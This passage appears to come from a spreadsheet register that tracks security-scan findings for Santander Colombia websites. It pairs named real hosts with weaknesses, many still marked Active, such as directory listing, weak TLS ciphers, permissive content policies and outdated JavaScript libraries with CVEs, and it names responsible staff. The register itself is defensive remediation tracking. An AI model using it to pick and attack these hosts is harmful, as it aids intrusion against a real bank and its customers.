    <s v="https://www.santander.com.co/rb_d56b4438-db41-4f20-9ef1-29ccacb1c640?type=js3&amp;sn=v_4_srv_1_sn_A57DAADACE437715EF1B219B9615F6D7_perc_100000_ol_0_mul_1_app-3A11137600a3d63bf2_1&amp;svrid=1&amp;flavor=post&amp;vi=QSTONFCFKEFAUFPAWMPJNISJRCKDBLBL-0&amp;modifiedSince=1702528372070&amp;rf=https%253A%252F%252Fwww.santander.com.co%252Fpg%252Fprestamos.html&amp;bp=3&amp;app=11137600a3d63bf2&amp;crc=680741421&amp;en=3a9l0fyd&amp;end=1"/>
    <m/>
    <m/>
    <d v="2023-12-16T00:00:00"/>
    <n v="920"/>
    <d v="2024-03-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios."/>
    <s v="Entre los mecanismos habituales de prevención del clickjacking se incluyen:_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="338"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-VM--859540238512312548"/>
    <m/>
    <x v="165"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="portalpagos.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-08T00:00:00"/>
    <n v="500"/>
    <d v="2025-05-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web tiene algunos directorios listados. Se puede obtener información muy sensible de los listados de directorios."/>
    <s v="Desactivar la exploración o el listado de directorios para todos los directorios."/>
    <m/>
    <s v="1° Fecha: 30/06/2025"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="339"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-VM-7672366120577977866"/>
    <m/>
    <x v="165"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="portalrecaudos.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-08T00:00:00"/>
    <n v="500"/>
    <d v="2025-05-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web tiene algunos directorios listados. Se puede obtener información muy sensible de los listados de directorios."/>
    <s v="Desactivar la exploración o el listado de directorios para todos los directorios."/>
    <m/>
    <s v="1° Fecha: 30/06/2025"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="340"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-VM-6613074351457283764"/>
    <m/>
    <x v="166"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="waf.confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-11-02T00:00:00"/>
    <n v="598"/>
    <d v="2025-01-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el Certificado del servidor y extrae la Clave Pública del Certificado para establecer la conexión segura._x000a__x000a_No se puede confiar en un certificado cuya fecha de caducidad haya pasado."/>
    <s v="Por favor, instale un certificado de servidor con fechas de inicio y fin válidas."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="341"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-VM-8737097710009665596"/>
    <m/>
    <x v="167"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="waf.confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-11-02T00:00:00"/>
    <n v="598"/>
    <d v="2025-01-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el certificado del servidor y extrae la clave pública del certificado para establecer la conexión segura. La autenticación se realiza verificando que la clave pública del certificado está firmada por una autoridad de certificación externa de confianza._x000a__x000a_Si un cliente no puede verificar el certificado, puede abortar la comunicación o pedir al usuario que continúe la comunicación sin autenticación."/>
    <s v="Instale un certificado de servidor firmado por una autoridad de certificación externa de confianza."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="342"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="87"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="204.93.139.149"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-26T00:00:00"/>
    <n v="605"/>
    <d v="2025-02-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cuando una Autoridad de Certificación (CA) emite un certificado, incorpora dos fechas: la fecha de inicio y la fecha de finalización de su validez. Si un cliente TLS (por ejemplo, un navegador web) se conecta a un servidor TLS (por ejemplo, un sitio web) y recibe un certificado caducado, se negará a conectarse. Los certificados son activos digitales que requieren renovación o descontinuación programada._x000a__x000a_Huella dactilar SHA-256_x000a_868350329e5e3828ca8a251e7314bf57adcbd7c6ca7ec4db71f509a4685d0b3b_x000a__x000a_https://tools.ietf.org/html/rfc5280#section-4.1.2.5"/>
    <s v="Los servicios que presentan certificados caducados pueden causar fallos visibles, por lo que debe confirmar que el servicio sigue en uso. Si no lo está, desactívelo. De lo contrario, contacte con la CA y solicite la emisión de un nuevo certificado._x000a__x000a_Evaluar la política de gestión de certificados de la organización para garantizar que los certificados se renueven o desactiven antes de su fecha de vencimiento."/>
    <s v="Los certificados caducados impiden que los clientes TLS se conecten a los servidores."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="343"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="156"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-03-24T00:00:00"/>
    <n v="456"/>
    <d v="2025-07-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Los registros del navegador son mensajes o información generados por los scripts o procesos backend de un sitio web, que se envían directamente a la consola del navegador. Estos registros suelen incluir información de depuración, mensajes de error, advertencias u otros resultados de diagnóstico que desarrolladores y usuarios utilizan para la resolución de problemas."/>
    <s v="- Limite los registros del navegador a la información de diagnóstico esencial._x000a__x000a_- Evite registrar datos confidenciales como credenciales de usuario o información de identificación personal._x000a__x000a_- Implementar controles para restringir el acceso a los registros del navegador únicamente al personal autorizado._x000a__x000a_- Utilice técnicas de cifrado u ofuscación para proteger la información confidencial dentro de los registros._x000a__x000a_- Revise y monitoree periódicamente los registros del navegador para detectar cualquier actividad inusual o sospechosa."/>
    <s v="El riesgo de emitir registros del navegador reside en la posible exposición de información confidencial a terceros no autorizados. Estos registros pueden revelar inadvertidamente credenciales de usuario, información personal identificable u otros datos confidenciales, que pueden ser explotados por actores maliciosos para robo de identidad, fraude u otros fines maliciosos. Además, la exposición de detalles internos del sistema o mensajes de error puede proporcionar a los atacantes información sobre posibles vulnerabilidades o debilidades en la infraestructura del sitio web."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="344"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="168"/>
    <m/>
    <s v="Active"/>
    <x v="3"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-12-12T00:00:00"/>
    <n v="558"/>
    <d v="2025-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La Política de Seguridad de Contenido no es eficaz para cumplir con los objetivos de seguridad definidos para prevenir ataques de secuencias de comandos entre sitios_x000a__x000a_Directiva:_x000a__x000a_script-src_x000a__x000a_Valor:_x000a__x000a_'unsafe-inline'_x000a__x000a_'unsafe-eval'"/>
    <s v="Para mejorar su configuración, asegúrese de:_x000a_Implementar directivas que establezcan restricciones de origen válidas y completas para cargar contenido dinámico ('script-src', 'object-src', 'default-src')._x000a_Evite el uso de directivas inseguras como 'unsafe-eval' y 'unsafe-inline'._x000a_Evite errores tipográficos o directivas CSP no válidas._x000a_Evite utilizar comodines, listas de permitidos basadas en host o esquemas de URL simples como 'HTTP' en las directivas de origen._x000a_Utilice fuentes específicas, como &quot;https://www.example.com&quot;. Elimine generalizaciones como &quot;http:&quot;, &quot;https:&quot;, &quot;https://*.com&quot;._x000a__x000a_'unsafe-eval': permite la ejecución de código inyectado en las API DOM como eval()._x000a__x000a_'unsafe-inline': permite la ejecución de scripts dentro de la página y controladores de eventos inseguros."/>
    <s v="Prevenir la carga de recursos y scripts de contenido no autorizados._x000a_Prevención del clickjacking y otros ataques de marcos anidados._x000a_Garantizar que los formularios web y los enlaces se comporten según lo previsto."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="345"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="QA-WAS-0579036e-4b5e-4426-a7b5-8e4bb98be69c"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="https://garantia.santanderconsumer.co/Home/Before"/>
    <m/>
    <m/>
    <d v="2023-02-18T00:00:00"/>
    <n v="1221"/>
    <d v="2023-05-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &quot;seguro&quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &quot;seguro&quot; a las cookies y fuerce a que todas las solicitudes confidenciales se envíen mediante HTTPS."/>
    <s v="Las cookies con el atributo &quot;seguro&quot; solo pueden enviarse a través de HTTPS. Las cookies enviadas a través de HTTP exponen a un usuario desprevenido a ataques de rastreo que podrían llevar a la suplantación de identidad del usuario o a la vulneración de la cuenta de la aplicación."/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="346"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="MAN-664dbecadafe1d62bb509729"/>
    <s v="SCO-24-CNMPA-004-CO-002"/>
    <x v="153"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2024-05-22T09:45:46"/>
    <n v="761.59321759259183"/>
    <d v="2024-09-19T09:45:46"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor utiliza algoritmos de cifrado CBC sobre TLS por lo que está afectado por vulnerabilidad la Lucky13. Todos los conjuntos de cifrado TLS y DTLS que incluyen el modo de cifrado CBC (Cipher-Block-Chaining) son potencialmente vulnerables a este tipo ataques."/>
    <s v="Se recomienda utilizar únicamente cifrados robustos como TLSv1.2 o TLSv1.3. Adicionalmente, se recomienda deshabilitar todos los algoritmos CBC (Cipher-Block-Chaining)."/>
    <s v="Los cifrados CBC sobre TLS podrían permitir a un atacante situado en mitad de las comunicaciones (MiTM) implementar una variante del ataque Padding Oracle (POODLE). En base a los posibles impactos aquí descritos y las posibilidades de su explotación se ha valorado esta vulnerabilidad con un riesgo bajo."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="347"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="MAN-393462d5"/>
    <s v="SCO-22-CNMPA-002-AP-002"/>
    <x v="21"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.5"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2022-08-11T11:53:01"/>
    <n v="1411.5048495370356"/>
    <d v="2022-12-09T11:53:01"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad &quot;secure&quot;, evitando que el identificador de sesión pueda ser transmitido por canales no seguros. La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger._x000a__x000a_"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de la misma. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto._x000a__x000a_https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer la versión y tipo del software que se está ejecutando en el activo analizado permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas. De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="348"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="MAN-393462d4"/>
    <s v="SCO-22-CNMPA-002-AP-001"/>
    <x v="118"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.5"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2022-08-11T11:51:42"/>
    <n v="1411.5057638888902"/>
    <d v="2022-12-09T11:51:42"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el siguiente atributo de seguridad:_x000a_• secure – este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal seguro como es HTTPs._x000a_La siguiente cookie no establece el indicador de cookie secure"/>
    <s v="Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad &quot;secure&quot;, evitando que el identificador de sesión pueda ser transmitido por canales no seguros."/>
    <s v="El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="349"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="MAN-664dbe3bdafe1d62bb509727"/>
    <s v="SCO-24-CNMPA-004-CO-001"/>
    <x v="169"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2024-05-22T09:43:23"/>
    <n v="761.59487268518569"/>
    <d v="2024-09-19T09:43:23"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha detectado que la aplicación no tiene implementada correctamente la cabecera, ya que el parámetro max-age tiene un valor inferior al recomendado. Además, no están establecidos los parámetros includeSubDomains y preload."/>
    <s v="Se recomienda establecer el parámetro max-age con el valor recomendado y establecer los parámetros includeSubDomains y preload. De modo que la cabecera HSTS quedaría de la siguiente forma: _x000a_• Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"/>
    <s v="Un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas. _x000a_En base a los posibles impactos aquí descritos y las posibilidades de su explotación se ha valorado esta vulnerabilidad con un riesgo bajo."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="350"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <m/>
    <x v="170"/>
    <m/>
    <s v="Active"/>
    <x v="3"/>
    <m/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-08-16T00:00:00"/>
    <n v="676"/>
    <d v="2024-12-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página intentó cargar un recurso que estaba bloqueado por la política CSP._x000a__x000a_Se rechazó la aplicación del estilo en línea porque viola la siguiente directiva de la Política de seguridad de contenido: &quot;default-src 'self'&quot;. Se requiere la palabra clave 'unsafe-inline', un hash ('sha256-hVrJIRjHPO7BeMLijW6cBMcegAhomV/DK0jWJl/Wy+M=') o un nonce ('nonce-...') para habilitar la ejecución en línea. Tenga en cuenta también que 'style-src' no se configuró explícitamente, por lo que 'default-src' se utiliza como alternativa."/>
    <s v="Los propietarios de sitios web deben revisar sus sitios para detectar mensajes de violación de CSP. Estos suelen ser una señal de que el sitio está intentando cargar recursos externos desconocidos o no verificados. Hay información detallada sobre estas violaciones disponible en la sección de detalles de evidencia."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="351"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="MAN-67234bfeb4b68f2a93497be5"/>
    <s v="SCO-24-CNMPA-015-VE-001"/>
    <x v="171"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.9"/>
    <s v="CVE-2021-21252_x000a_CVE-2021-2125_x000a_CVE-2022-31147"/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-10-25T00:00:00"/>
    <n v="606"/>
    <d v="2025-02-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha identificado que la aplicación utiliza una versión desactualizada de la librería jQuery con vulnerabilidades conocidas. Estas vulnerabilidades pueden ser explotadas por usuarios malintencionados para ejecutar código arbitrario, manipular el DOM o desencadenar ataques de Cross-Site Scripting (XSS), poniendo en riesgo la integridad y confidencialidad de la aplicación._x000a__x000a_jDurante la revisión del activo, se han observado que la aplicación web hace uso de la librería javascript jQuery 1.17.0 en los siguientes recursos y con las siguientes vulnerabilidades asociadas._x000a__x000a_URL de la librería:_x000a_https://garantia.santanderconsumer.co/lib/jquery-validation/dist/jquery.validate.min.js_x000a__x000a_Recursos que hacen uso de la librería:_x000a_• / - Raíz de la aplicación web_x000a__x000a_CVEs asociados a la versión de jQuery detectada:_x000a_• CVE-2021-21252: Regular Expression Denial of Service vulnerability_x000a_• CVE-2021-43306: ReDoS vulnerability in URL2 validation_x000a_• CVE-2022-31147: ReDoS vulnerability in url and URL2 validation_x000a_"/>
    <s v="Se recomienda actualizar la librería javascript de jQuery a una versión más reciente que solucione estas vulnerabilidades. También puede ser beneficioso aplicar parches de seguridad si están  disponibles en los repositorios oficiales. Si la actualización no es posible, se debe considerar buscar alternativas a jQuery, implementar medidas de seguridad adicionales como, por ejemplo, la edición del código fuente o la eliminación de cualquier información que pueda inducir a descubrir su versión."/>
    <s v="Un usuario malintencionado podría buscar información sobre vulnerabilidades o exploits en función de la versión de jQuery utilizada por la aplicación para preparar un ataque dirigido sobre ella con mayor probabilidad de éxito. Algunos de los riesgos más significativos podrían ser:_x000a_• Exposición de datos sensibles._x000a_• Ejecución de código malicioso._x000a_• Interrupción o modificación de la funcionalidad de la aplicación que haga uso de la librería."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="352"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="MAN-672258bcb4b68f2a93494404"/>
    <s v="SCO-24-CNMPA-015-VE-002"/>
    <x v="172"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.9"/>
    <s v="CVE-2024-6531"/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-10-26T00:00:00"/>
    <n v="605"/>
    <d v="2025-02-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha identificado que la aplicación utiliza una versión desactualizada de la librería Bootstrap con vulnerabilidades conocidas. Estas vulnerabilidades pueden ser explotadas por usuarios malintencionados para ejecutar código arbitrario, manipular el DOM o desencadenar ataques de Cross-Site Scripting (XSS), poniendo en riesgo la integridad y confidencialidad de la aplicación._x000a__x000a_Durante la revisión del activo, se han observado que la aplicación web hace uso de la librería javascript Bootstrap 4.3.1 en los siguientes recursos y con las siguientes vulnerabilidades asociadas._x000a__x000a_URL de la librería:_x000a_https://garantia.santanderconsumer.co/lib/bootstrap/dist/js/bootstrap.bundle.min.js_x000a_Recursos que hacen uso de la librería:_x000a_• / - Raíz de la aplicación web_x000a_CVEs asociados a la versión de jQuery detectada:_x000a_• CVE-2024-6531: Bootstrap Cross-Site Scripting (XSS) vulnerability"/>
    <s v="Se recomienda actualizar la librería javascript de Bootstrap a una versión más reciente que solucione estas vulnerabilidades. También puede ser beneficioso aplicar parches de seguridad si están disponibles en los repositorios oficiales. Si la actualización no es posible, se debe considerar buscar alternativas a jQuery, implementar medidas de seguridad adicionales como, por ejemplo, la edición del código fuente o la eliminación de cualquier información que pueda inducir a descubrir su versión"/>
    <s v="Un usuario malintencionado podría buscar información sobre vulnerabilidades o exploits en función de la versión de jQuery utilizada por la aplicación para preparar un ataque dirigido sobre ella con mayor probabilidad de éxito. Algunos de los riesgos más significativos podrían ser:_x000a_• Exposición de datos sensibles._x000a_• Ejecución de código malicioso._x000a_• Interrupción o modificación de la funcionalidad de la aplicación que haga uso de la librería."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="353"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="QA-WAS-c86595e9-ae9a-4760-b72a-a609d664997d"/>
    <m/>
    <x v="164"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="6.4"/>
    <m/>
    <m/>
    <s v="https://garantia.santanderconsumer.co/"/>
    <m/>
    <m/>
    <d v="2024-11-09T00:00:00"/>
    <n v="591"/>
    <d v="2025-02-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Bootstrap es un framework CSS gratuito y de código abierto para el desarrollo web responsivo. Contiene plantillas de diseño basadas en HTML, CSS y JavaScript para tipografía, formularios, botones, navegación y otros componentes de la interfaz._x000a__x000a_La aplicación web utiliza una biblioteca JavaScript que se sabe que contiene al menos una vulnerabilidad."/>
    <s v="Consulte la información proporcionada en la sección de respuestas.  Consulte también los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="354"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="QA-WAS-d8796841-871e-4953-b81d-eadc4a42fade"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo ;secure;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo ;secure; a las cookies y obligue a que todas las peticiones sensibles se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="355"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="QA-WAS-1c198d2e-5d8e-4a1c-a75f-ca5e3a2c281e"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.2"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/rb_bf10849rjg?type=js3&amp;sn=v_4_srv_4_sn_54E3FC5B06B89ECF139F8770F2565A0F_perc_100000_ol_0_mul_1_app-3A0e06b2b0e5f9e5f4_1&amp;svrid=4&amp;flavor=post&amp;vi=CICFKCFMKABBKECGRNKUQPUCLTMUTESP-0&amp;modifiedSince=1744546783080&amp;rf=https%3A%2F%2Fwww.santander.com.co%2Fpg%2Fhost-to-host.html&amp;bp=3&amp;app=0e06b2b0e5f9e5f4&amp;crc=2110100888&amp;en=flo1gyf2&amp;end=1"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios."/>
    <s v="Entre los mecanismos habituales de prevención del clickjacking se incluyen:_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="356"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <m/>
    <x v="151"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="6.4"/>
    <m/>
    <m/>
    <s v="https://garantia.santanderconsumer.co/"/>
    <n v="443"/>
    <m/>
    <d v="2025-04-11T00:00:00"/>
    <n v="438"/>
    <d v="2025-07-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="357"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <s v="SC-25-CNMPA-002-CO-001"/>
    <x v="173"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.7"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/recursos/archivos/, "/>
    <m/>
    <m/>
    <d v="2025-05-27T00:00:00"/>
    <n v="392"/>
    <d v="2025-09-24T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación web analizada alberga uno o más ficheros que contienen metadatos y que pueden_x000a_proporcionar información interna de la organización, tales como nombres de empleados, códigos_x000a_de usuario o versiones de software."/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos_x000a_generados y/o publicados en la aplicación. De manera adicional se puede implementar un_x000a_procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los_x000a_mismos no contengan información sensible de la organización en sus metadatos."/>
    <s v="La información contenida en los metadatos de los archivos identificados podría ser utilizada por un_x000a_atacante para obtener un mayor conocimiento de la organización, tecnologías utilizadas e incluso_x000a_nombres de usuarios. Con esta información el atacante puede planificar ataques de ingeniería social_x000a_o phishing dirigidos a determinados usuarios."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="358"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <s v="SC-25-CNMPA-002-CO-002"/>
    <x v="174"/>
    <m/>
